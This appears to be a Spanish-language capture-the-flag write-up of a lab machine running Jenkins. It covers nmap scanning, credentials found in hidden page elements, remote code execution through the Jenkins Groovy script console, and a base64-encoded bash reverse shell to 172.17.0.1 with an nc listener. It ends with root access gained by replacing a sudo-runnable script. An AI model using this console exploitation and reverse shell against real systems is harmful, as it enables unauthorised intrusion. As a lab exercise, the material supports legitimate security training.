Fecha: 19/09/2024

Comienzo escaneando la máquina:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](Imágenes/Pasted%20image%2020240918005959.png)

Inspeccionando la página web en el puerto 80, encuentro 3 "spans" ocultos (`class = "hidden"`). Una de ellas es, posiblemente, el "nombre de dominio" de la página: "`jenhack.hl`". Los otros dos podrían ser un nombre de usuario y contraseña. `jenkins-admin`:`cassandra` 

![](Imágenes/Pasted%20image%2020240918132733.png)

Paso ahora al puerto 443. Encuentro una pantalla de login de jenkins. Al probar con estas credenciales, me da un error de servidor, así que probaré en el puerto 8080. Obtengo acceso al panel de administración: 

![](Imágenes/Pasted%20image%2020240918132901.png)

Investigando en [hacktricks](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security), encuentro varios trucos que puedo hacer:

Buscar más usuarios entrando en `/asynchPeople/` -> sin éxito, solo está el usuario de administración:
![](Imágenes/Pasted%20image%2020240918133231.png)

Ejecutar código remoto con un "Groovy Script", entrando en `/script`. 
![](Imágenes/Pasted%20image%2020240918133321.png)

Aquí podré ejecutar comandos de la siguiente forma:
```groovy
def process = "sh -c <comando>".execute()
println("Salida: ${process.text}")
```

En la misma página encuentro una forma de hacerme una reverse shell: 
```bash
# Obtener el base64 de lo que queremos ejecutar:
echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'" | base64 

# En la script console:
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzkwMDEgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
# En mi máquina atacante:
nc -lvnp 9001
```

Trato la TTY: 
```bash
# Empezando desde la reverse shell:
script /dev/null -c bash

Control Z 

stty raw -echo; fg

reset xterm

export TERM=xterm
```

Al no encontrar nada que hacer con permisos SUID y no poder ejecutar sudo -l por no saber la contraseña, miro /etc/passwd:
![](Imágenes/Pasted%20image%2020240918134837.png)

Aquí encuentro un usuario, jenkhack. Miraré que ficheros cuyos nombres le hagan referencia: 
```bash
find / -name "jenkhack" 2>/dev/null
```

![](Imágenes/Pasted%20image%2020240919130322.png)

Parece un usuario y contraseña. Como la contraseña no funciona, imagino que está cifrada. Utilizo el identificador de cifrado de [dcode.fr](https://www.dcode.fr/identificador-cifrado) y encuentro que se trata de un "ASCII85 Encoding"

![](Imágenes/Pasted%20image%2020240919130714.png)

Uso su decoder y el resultado es `jenkinselmejor`. Una vez inicié sesión como jenkhack, comprobé sus permisos:
![](Imágenes/Pasted%20image%2020240919131110.png)

Pensé que con hacer `sudo /usr/local/bin/bash` ya estaría, pero resulta que no es un bash sino un script. 

![](Imágenes/Pasted%20image%2020240919131216.png)

Miro el contenido del script y encuentro esto:
![](Imágenes/Pasted%20image%2020240919131243.png)

Elimino ese fichero y creo uno nuevo para que me ejecute una shell. 


![](Imágenes/Pasted%20image%2020240919132123.png)

Tras darle permisos y ejecutar el script con sudo, ya somos root. 

![](Imágenes/Pasted%20image%2020240919132054.png)